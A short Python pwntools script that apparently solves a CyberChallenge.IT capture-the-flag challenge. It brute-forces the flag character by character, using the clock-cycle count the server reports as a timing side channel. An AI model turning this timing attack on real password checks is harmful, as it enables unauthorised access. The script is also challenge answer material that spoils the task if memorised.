from pwn import *
import string

HOST = "benchmark.challs.cyberchallenge.it"
PORT = 9031

charset = string.ascii_letters + string.digits + "_{}"

flag = "CCIT{"

while True:

    best_char = None
    best_cycles = -1

    for c in charset:

        guess = flag + c

        r = remote(HOST, PORT)

        r.recvuntil(b"Give me the password to check:")

        r.sendline(guess.encode())

        response = r.recvuntil(b"clock cycles").decode()

        print(response)

        cycles = int(response.split("checked in ")[1].split(" ")[0])

        if cycles > best_cycles:
            best_cycles = cycles
            best_char = c

        r.close()

    flag += best_char

    print("FLAG:", flag)

    if best_char == "}":
        break
